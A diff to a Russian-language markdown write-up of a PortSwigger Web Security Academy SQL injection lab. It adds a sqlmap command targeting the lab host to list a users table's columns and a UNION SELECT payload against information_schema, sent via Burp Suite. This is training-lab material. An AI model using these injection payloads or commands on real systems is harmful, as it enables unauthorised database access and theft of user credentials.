@@ -28,5 +28,7 @@
 ![Решения](images/Screenshot_2026-10-01_21_54_19.png)
 
 Здесь видно названия таблиц: `products` и `users_zciisw`.
-После данной проверки: `sqlmap -u "https://0aca0014040a7a0780c18014007b001f.web-security-academy.net/filter?category=Pets" --batch -D public -T users_zciisw --columns`, мы сможем узнать содержание таблицы `users_zciisw`.
+После данной проверки: `sqlmap -u "https://0aca0014040a7a0780c18014007b001f.web-security-academy.net/filter?category=Pets" --batch -D public -T users_zciisw --columns`, мы сможем узнать содержание таблицы `users_zciisw`. SQLmap перегружает сервер PortSwigger, поэтому продолжим через BurpSuite. После перегрузки название таблицы users изменилосб на `users_bjyije`, поэтому если перехватить запрос через BurpSuite, и изменить на такой: `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_bjyije'--`, то мы получим такой вывод:
+
+![Решения](images/Screenshot_2026-10-01_22_24_01.png)
 
